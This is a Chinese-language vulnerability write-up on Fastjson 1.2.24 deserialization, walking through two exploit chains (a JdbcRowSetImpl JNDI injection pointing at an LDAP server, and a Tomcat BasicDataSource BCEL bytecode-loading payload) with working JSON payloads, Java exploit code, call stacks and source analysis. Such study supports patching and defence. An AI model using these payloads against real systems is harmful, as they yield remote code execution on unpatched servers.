# Fastjson简介

fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从
JSON 字符串反序列化到 JavaBean。

利用点：对JavaBean格式类的序列化与反序列化会有方法执行，可以构造恶意执行链。

# 环境搭建

pom.xml

    
    
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
    <dependency>
          <groupId>org.apache.tomcat</groupId>
          <artifactId>tomcat-dbcp</artifactId>
          <version>8.0.36</version>
    </dependency>
    

# 手写EXP

## 可以出网的利用

    
    
    import com.alibaba.fastjson.JSON;
    
    public class DemoTest {
        public static void main(String[] args) {
            JSON.parse("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/lasthh\",\"autoCommit\":\"true\"}");
        }
    }
    

## 不能出网的利用

    
    
    import com.alibaba.fastjson.JSON;
    import com.sun.org.apache.bcel.internal.util.ClassLoader;
    import com.sun.org.apache.bcel.internal.classfile.Utility;
    import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;
    import java.nio.file.FileSystems;
    import java.nio.file.Files;
    import java.nio.file.Path;
    import java.io.*;
    import java.nio.file.Paths;
    
    
    public class DemoTest1 {
        public static void main(String[] args) throws Exception {
    
            ClassLoader classLoader = new ClassLoader();
            byte[] bytes = Files.readAllBytes(Paths.get("E:\\JAVA\\fastjson\\target\\classes\\Exp1.class"));
            String code = Utility.encode(bytes, true);
    //      classLoader.loadClass("$$BCEL$$"+code).newInstance();
    
            JSON.parseObject("{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$" + code +"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}");
            //根据BasicDataSource中forName的加载逻辑，可以知道它是进行了初始化的。
        }
            public static byte[] readBytesFromClassFile(Path filePath) throws Exception {
                return Files.readAllBytes(filePath);
            }
    }
    

# 调用栈

    
    
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    connect:624, JdbcRowSetImpl (com.sun.rowset)
    setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
    deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
    parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
    parse:137, JSON (com.alibaba.fastjson)
    parse:128, JSON (com.alibaba.fastjson)
    main:5, DemoTest
    
    
    
    defineClass:642, ClassLoader (java.lang)
    loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)
    loadClass:357, ClassLoader (java.lang)
    forName0:-1, Class (java.lang)
    forName:348, Class (java.lang)
    createConnectionFactory:2125, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
    createDataSource:2032, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
    getConnection:1532, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
    main:23, DemoTest1
    

# 漏洞分析

## 出网

从payload中可以知道，会先调用com.sun.rowset.JdbcRowSetImpl下的setdataSourceName方法，先看if判断，此时肯定为null，所以调用父类的setDataSourceName方法。

![](./img/114933824397045564.png)

可以看到父类成功赋值。

![](./img/7555455126179824225.png)

继续看com.sun.rowset.JdbcRowSetImpl下的setAutoCommit方法，当this.conn为空时可以执行this.connect。

![](./img/7911140474981990417.png)

而this.con默认为null，所以会进入到connect方法体内，此时this.con默认为null，this.getDataSourceName不为空（我们在前面已经赋值过了），所以会流程会走到lookup()，这就是一个JNDI注入漏洞的触发点。

![](./img/1137224376163287725.png)

## 不出网

先看漏洞触发点：

com.sun.org.apache.bcel.internal.util.ClassLoader类下的protected Class
loadClass(String class_name, boolean resolve)。

可以看到这里可以传入一个BCEL类型的字节码，而且在后面的流程当中会加载字节码并实例化，所以可以构造恶意的BCEL码。

![](./img/7040343640141442416.png)

利用方式为:

    
    
    ClassLoader classLoader = new ClassLoader();
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\JAVA\\fastjson\\target\\classes\\Exp1.class"));
        String code = Utility.encode(bytes, true);
        classLoader.loadClass("$$BCEL$$"+code).newInstance();
    

寻找其它类来调用，可以找到org.apache.tomcat.dbcp.dbcp2.BasicDataSource。

注意到playload用的是JSON.parseObject会执行类下的setter方法和符合条件的getter方法。

可以看到会调用getConnection方法，然后是createDataSource方法。

![](./img/1620860758569674918.png)

又在createDataSource中调用createConnectionFactory方法。

![](./img/2755384094381039235.png)

可以看到此时driverToUse为null，driverClassLoader不为null。true的意思是在加载类时会执行static代码块。所以就清楚了，我们只要给

driverClassName传入我们构造的BCEL字节码，driverClassLoader传入字节码对应的ClassLoader就可以了。

    
    
    driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
    

![](./img/6530666906385501764.png)

fastjson反序列化赋值,可以看到对这两个属性赋值的setter方法没有什么限制条件，所以直接传值即可。

    
    
    JSON.parseObject("{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$" + code +"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}");
    

![](./img/7485182487829020063.png)

![](./img/6014248862204554866.png)

# 注意点（手写EXP时）

对dataSourceName传值要加载远程`Reference`绑定的恶意对象，对autoCommit传值，任意的布尔类型都可以。

# 总结

利用JdbcRowSetImpl类，需要目标可以出网，JDK版本不能太高，限制性强。

利用BasicDataSource类，目标不需要出网，但需要有Tomcat的依赖，较为普遍。

